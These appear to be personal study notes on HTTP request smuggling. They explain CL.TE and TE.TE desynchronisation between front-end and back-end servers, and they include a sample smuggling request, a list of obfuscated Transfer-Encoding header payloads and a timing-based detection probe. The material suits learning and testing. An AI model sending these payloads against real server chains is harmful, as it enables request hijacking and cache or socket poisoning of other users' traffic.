# Core Concepts 
HTTP/1.1 allows sending multiple requests in a single HTTP connection.
requests are aligned sequentially and the servers parsers the headers to 
determine a request begins and ends and where another starts. 

This of course is harmless but with the modern natures of systems, 
distributed and communicated with each using HTTP, a semantic gap is 
created where there is a gap btn a front-end server and a back-end 
server and these two/more servers tend to parse these HTTP requests 
slightly differently. 

# On Transfer-Encoding and Content-Length
If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.
Whenever we find a way to hide the Transfer-Encoding header from one server in a chain it will fall back to using the Content-Length and we can desynchronize the whole system

# TE.TE 
A scenario where both the back end and front end server 
support Transfer-Encoding but one can be induced to ignore 
the header by obfuscating the header value. 

# Sample Request
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 6
> Transfer-Encoding: chunked

> 0\r\n
> G\r\n
> \r\n
> POST / HTTP/1.1
> Host: example.com


> 0 (1 byte)
> \r\n (carriage return + line feed, 2 bytes)
> G (1 byte)
> \r\n (carriage return + line feed, 2 bytes)


# Obfuscating Payloads 
> Transfer-Encoding: xchunked

> Transfer-Encoding : chunked

> Transfer-Encoding: chunked
> Transfer-Encoding: x

> Transfer-Encoding:[tab]chunked

> [space]Transfer-Encoding: chunked

> X: X[\n]Transfer-Encoding: chunked

> Transfer-Encoding
> : chunked


Detecting HTTP Request Smuggling
I'll refer to this orientation as CL.TE for short. We can detect potential request smuggling by sending the following request:
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q

Thanks to the short Content-Length, the front end will forward the blue text only, and the back end will time out while waiting for the next chunk size. This will cause an observable time delay.

If both servers are in sync (TE.TE or CL.CL), the request will either be rejected by the front-end or harmlessly processed by both systems. Finally, if the desync occurs the other way around (TE.CL) the front-end will reject the message without ever forwarding it to the back-end, thanks to the invalid chunk size 'Q'. This prevents the back-end socket from being poisoned.



# Further Research:
https://docs.varnish-software.com/security/VSV00011/

# Real World Exploits
https://hackerone.com/reports/919175